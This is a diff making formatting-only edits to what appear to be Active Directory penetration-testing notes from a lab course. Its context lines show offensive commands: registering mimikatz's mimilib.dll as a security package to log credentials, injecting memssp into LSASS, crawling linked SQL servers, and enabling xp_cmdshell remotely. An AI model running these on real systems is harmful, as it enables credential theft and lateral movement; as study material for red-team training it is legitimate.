@@ -570,7 +570,7 @@ Mimikatz provides a custom SSP - `mimilib.dll`. This SSP logs local logons, serv
 
 To achieve this we can use two techniques:
 
-1. Drop mimilib.dll to System32 and add it to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`:
+i. Drop mimilib.dll to System32 and add it to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`:
 
 ```powershell
 $packages=Get-ItemProperty
@@ -580,7 +580,8 @@ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Sec
 Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
 ```
 
-2. Using mimikatz, inject into LSASS (Not stable with Server 2016)
+ii. Using mimikatz, inject into LSASS (Not stable with Server 2016)
+
 ```powershell
 Invoke-Mimikatz -Command '"misc::memssp"'
 ```
@@ -729,6 +730,7 @@ select * from openquery("dcorp-sql1",'select * from master..sysservers')
 ```
 
 **PowerUpSQL**
+
 ```powershell
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
 ```
@@ -739,8 +741,10 @@ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''sel
 ```
 
 #### Executing Commands
+
 - On the target server, either `xp_cmdshell` should be already enabled; or
 - If `rpcout` is enabled (disabled by default), `xp_cmdshell` can be enabled using:
+
 ```sql
 EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
 ```
